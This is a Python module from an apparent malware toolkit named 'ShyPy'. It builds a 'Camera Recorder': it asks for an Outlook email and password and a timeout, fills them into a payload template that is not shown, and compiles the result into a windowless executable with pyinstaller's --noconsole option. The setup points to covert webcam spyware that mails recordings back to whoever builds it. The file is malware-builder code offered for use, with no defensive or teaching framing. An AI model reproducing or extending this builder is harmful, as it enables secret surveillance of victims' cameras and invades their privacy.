from colorama import Fore as f
import time
import os
import platform

def clear_terminal():
    os_name = platform.system().lower()
    if os_name == "linux" or os_name == "darwin":
        os.system("clear")
    elif os_name == "windows":
        os.system("cls")

class Camera_Recorder():
    def __init__(self):
        self.user_name = ""
        self.user_password = ""
        self.time_out = ""
        self.start()
    
    def C_Recorder(self, name, user_mail, user_mail_password, time_out):

        if platform.system() == "Windows":
            os.system("cls")
            file_name = "Modules\Camera_Recorder\Payloads\DefaultPayload.txt"
        else:
            os.system("clear")
            file_name = "Modules/Camera_Recorder/Payloads/DefaultPayload.txt"

        file_loc = os.path.abspath(os.path.join(os.getcwd(),file_name))
        
        with open(name, "w", encoding="utf-8") as file:
            
            with open(file_loc, 'r', encoding='utf-8') as file1:  
                file_content = file1.read()
                file_content = file_content.replace("{user_mail}", user_mail)
                file_content = file_content.replace("{user_password}", user_mail_password)
                file_content = file_content.replace("{time_out}", time_out)
                file.write(file_content)

    def conver_to_exe(self, name):
        python_files = name
        if platform.system() == "Windows":
            os.system(f"pyinstaller --onefile --noconsole --clean {python_files}")
        else:
            os.system(f"pyinstaller --onefile --noconsole {python_files}")
            
    def ended(self, name):
        
        deleted_file = name
        os.remove(deleted_file)
        exe_location = name.replace(".py", ".exe")
        exe_loc = os.path.abspath(exe_location)
        dist_folder = os.path.abspath(os.path.join(exe_loc, os.pardir))
        print(f.RESET)
        clear_terminal()

        if platform.system() == "Windows":
            print(f"[!] Camera Recorder Was Created On this Location: {dist_folder}\dist\{exe_location} ")      
        else:
            print(f"[!] Camera Recorder Was Created On this Location: {dist_folder}/dist/{exe_location} ")

    def start(self):
        clear_terminal()
        print(f"""
            ╔══════════════════════════════════════════════════════════════════════╗
            ║*                        - Camera Recorder -                         *║
            ╠══════════════════════════════════════════════════════════════════════╣
            ║ RULES : Outlook.com Should Be Used As The e-mail Address.            ║
            ╠══════════════════════════════════╦═══════════════════════════════════╣ 
            ║            Commands              ║            Function               ║    
            ╠══════════════════════════════════╬═══════════════════════════════════╣   
            ║ "set.mail"                       : Set Mail Adress.                  ║ 
            ║ "set.password"                   : Set Mail Password.                ║
            ║ "set.timeout"                    : Set Time Out.                     ║ 
            ║ "generate"                       : Generate a Camera Recorder.       ║
            ║ "back"                           : Back To Shypy.                    ║                              
            ╠══════════════════════════════════╬═══════════════════════════════════╣
            ║*            E-Mail               : {self.user_name}
            ╠══════════════════════════════════╬═══════════════════════════════════╬
            ║*           Password              : {self.user_password}
            ╠══════════════════════════════════╬═══════════════════════════════════╬
            ║*          Time Out               : {self.time_out}
            ╠══════════════════════════════════╩═══════════════════════════════════╣            
            ║*                            - The ShyPy -                           *║ 
            ╚══════════════════════════════════════════════════════════════════════╝
            \n\n""")

        answer = input("[ShyPy]: ")       
        if answer.startswith("set.mail "):
            answer = answer.replace('set.mail ', '') 
            self.user_name = answer
            self.start() 
            
        elif answer.startswith("set.password "):
            answer = answer.replace('set.password ', '') 
            self.user_password = answer
            self.start()
            
        elif answer.startswith("set.timeout "):
            answer = answer.replace('set.timeout ', '') 
            self.time_out = answer
            self.start()
                     
        elif answer == "generate":
            user_pm_name = input("[+] The Name Of The User's Camera Recorder: ")
            user_pm_name = user_pm_name + ".py"
            self.C_Recorder(user_pm_name, self.user_name, self.user_password, self.time_out)
            self.conver_to_exe(user_pm_name)
            self.ended(user_pm_name)

        elif answer == "back":
            os.system("cd ..")
            os.system("cd ..")
            os.system("python Shypy.py")
        else:
            print(f.LIGHTYELLOW_EX + "[!] Invalid Option" + f.LIGHTCYAN_EX)
            time.sleep(0.5)
            self.start()

PM = Camera_Recorder()











































